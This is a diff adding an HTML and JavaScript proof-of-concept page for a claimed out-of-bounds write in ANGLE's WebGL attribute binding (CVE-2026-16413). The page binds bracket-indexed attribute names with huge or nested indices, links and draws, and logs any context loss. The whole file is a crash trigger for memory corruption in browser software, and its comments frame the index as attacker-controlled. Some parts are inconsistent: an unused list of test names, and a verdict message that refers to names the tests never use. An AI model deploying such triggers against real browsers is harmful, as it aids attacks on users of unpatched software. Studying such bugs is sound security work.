@@ -1,0 +1,83 @@
+<!doctype html>
+<!-- CVE-2026-16413 — ANGLE ProgramBindings: attribute/output bindings honor bracket indexing
+  Pre-fix (@130 libANGLE/Program.cpp:344-346,381-383,847) stores the full bracketed name on
+  glBindAttribLocation("a0[N]"); on link the bracket index is honored -> OOB write in the
+  attribute-binding resolution. Fix CL 7952070 adds BindLocationPolicy::IgnoreIndexing.
+  Trigger: standard WebGL glBindAttribLocation (no extension) + linkProgram. -->
+<meta charset="utf-8">
+<title>CVE-2026-16413</title>
+<pre id="log">running…</pre>
+<script>
+const L=[];const log=(...a)=>{L.push(a.join(' '));document.getElementById('log').textContent=L.join('\n');};
+const errName=(gl,e)=>{for(const k of ['NO_ERROR','INVALID_OPERATION','INVALID_VALUE','OUT_OF_MEMORY','CONTEXT_LOST'])if(gl[k]===e)return k;return '0x'+e.toString(16);};
+const VSARR = `#version 300 es
+in vec4 a_pos;
+void main(){
+  gl_Position = a_pos;
+}`;
+const FS = `#version 300 es
+precision highp float;
+out vec4 o;
+void main(){ o = vec4(1.0); }`;
+
+// bracketed binding variants. Attacker controls the index via the name string.
+const NAMES = [
+  ['a0[1]        (regression-test shape)', 'a0[1]'],
+  ['a0[999999]   (huge index -> OOB)',     'a0[999999]'],
+  ['a0[10000000] (huge index -> OOB)',     'a0[10000000]'],
+  ['a0[1][0]     (nested bracket)',        'a0[1][0]'],
+  ['a0[0]        (control, valid)',        'a0[0]'],
+];
+
+function trial(gl, label, nameToBind){
+  const p=gl.createProgram();
+  const vs=gl.createShader(gl.VERTEX_SHADER); gl.shaderSource(vs,VSARR); gl.compileShader(vs);
+  if(!gl.getShaderParameter(vs,gl.COMPILE_STATUS)){ log('  [VS compile FAIL] '+(gl.getShaderInfoLog(vs)||'').trim().replace(/\s+/g,' ').slice(0,120)); }
+  const fs=gl.createShader(gl.FRAGMENT_SHADER); gl.shaderSource(fs,FS); gl.compileShader(fs);
+  gl.attachShader(p,vs); gl.attachShader(p,fs);
+  gl.getError();
+  if(nameToBind!==null) gl.bindAttribLocation(p, 5, nameToBind);
+  const e1=gl.getError();
+  gl.linkProgram(p);
+  const lk=gl.getProgramParameter(p,gl.LINK_STATUS);
+  const e2=gl.getError();
+  const inf=(gl.getProgramInfoLog(p)||'').trim().replace(/\s+/g,' ').slice(0,100);
+  let locBound='-',locPlain='-',locBr='-',locAttr='gl.getAttribLocation' in gl ? '-' : '-';
+  if(lk){
+    locAttr = gl.getAttribLocation(p,'a_pos');
+    if(nameToBind){ locBound = gl.getAttribLocation(p, nameToBind); }
+    locBr = gl.getAttribLocation(p,'a_pos[1]');
+  }
+  log(`[${label}] link=${lk?'ok':'fail'} loc(a_pos)=${locAttr} loc(bound "${nameToBind}")=${locBound} loc("a_pos[1]")=${locBr} ctxLost=${gl.isContextLost()}`);
+  if(lk){ gl.useProgram(p); gl.viewport(0,0,1,1); gl.drawArrays(gl.TRIANGLES,0,3); log(`   draw glError=${errName(gl,gl.getError())} ctxLost=${gl.isContextLost()}`); }
+  gl.deleteProgram(p);
+  return gl.isContextLost();
+}
+
+function run(kind){
+  log('--- '+kind+' ---');
+  const c=document.createElement('canvas');
+  const gl=c.getContext(kind,{antialias:false,depth:false,stencil:false,alpha:false});
+  if(!gl){log(kind+' unavailable');return 'NO-WEBGL';}
+  try{const d=gl.getExtension('WEBGL_debug_renderer_info');if(d)log('renderer:',gl.getParameter(d.UNMASKED_RENDERER_WEBGL));}catch(e){}
+  const cases=[
+    ['no-bind (control)',            null],
+    ['bind a_pos (control, no [)',   'a_pos'],
+    ['bind a_pos[0] (control, [0])', 'a_pos[0]'],
+    ['bind a_pos[1] (bracket)',      'a_pos[1]'],
+    ['bind a_pos[999999] (huge idx)','a_pos[999999]'],
+    ['bind ghost[1] (no such attr)', 'ghost[1]'],
+    ['bind a_pos[1][0] (nested)',    'a_pos[1][0]'],
+  ];
+  let anyCrash=false;
+  for(const [label,name] of cases){
+    if(trial(gl,label,name)){anyCrash=true; log('   !! context lost'); break;}
+  }
+  log('VERDICT: '+(anyCrash?'CRASH/CTXLOSS':'no crash — compare loc(a0[1]) honored(130) vs -1(150)'));
+  document.title='CVE-2026-16413: '+(anyCrash?'CRASH':'no-crash');
+  return anyCrash?'CRASH':'no-crash';
+}
+
+log('UA:',navigator.userAgent);
+run('webgl2');
+</script>
